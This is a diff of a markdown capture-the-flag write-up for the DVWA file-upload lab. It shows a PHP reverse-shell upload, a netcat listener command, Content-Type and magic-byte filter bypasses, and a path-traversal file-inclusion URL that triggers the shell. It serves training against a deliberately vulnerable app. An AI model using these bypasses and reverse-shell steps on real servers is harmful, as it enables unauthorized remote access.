@@ -1,18 +1,12 @@
 # :globe_with_meridians: Writeups for Damn Vulnerable Web Application (DVWA)
 
-> **Original Source:** [Writeups for Damn Vulnerable Web Application (DVWA)](https://infosecwriteups.com/writeups-for-damn-vulnerable-web-application-dvwa-ba42a43afca1)
-> **Platform:** infosecwriteups.com | **Category:** `WEB`
-
 ---
 
 ## File Upload
 
-
 **Security level is currently: low.**
 
-
 php reverse shell code:
-
 
 ```
 <?php
@@ -197,18 +191,13 @@ echo '</pre>';
 ?>
 ```
 
-
 Listing IP: `192.168.170.131` port: `9001`
-
 
 netcat listener command: `nc -lvnp 9001`
 
-
 upload the file `rev.php` and visit the url : `[http://192.168.170.131/hackable/uploads/rev.php](http://192.168.170.131/hackable/uploads/rev.php)`
 
-
 and you have reverse shell:
-
 
 ```
 ┌─[✗]─Jack@parrot]─[~/Downloads/dvwa]
@@ -222,40 +211,26 @@ uname
 Linux
 ```
 
-
 **Security level is currently: medium.**
-
 
 This time it is blocking php file we can bypass that by changing:
 
-
 `Content-Type: application/x-php` ==> `Content-Type: image/png`
-
 
 we can also do that from browser go to inspect element ,Network tab resubmit the request so it show up on network tab select that upload request right click and Edit and Resend:
 
-
 make changes and hit send button,visit the url and you have reverse shell.
-
 
 **Security level is currently: high.**
 
-
 Changing Content-Type is not working maybe server is verifying the file header signature.
-
 
 add `GIF98;` at the start of our exploit file and rename it with `rev.php.jpg`.
 
-
 but whene we visit it directly it is not working so we use file inclusion:
 
-
 url: `http://192.168.170.131/vulnerabilities/fi/?page=file/../../../hackable/uploads/rev.php.jpg` <- security high
-
 
 and we have reverse shell on our netcat listener.
 
 ---
-
-*Originally published on [Medium](https://infosecwriteups.com/writeups-for-damn-vulnerable-web-application-dvwa-ba42a43afca1). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
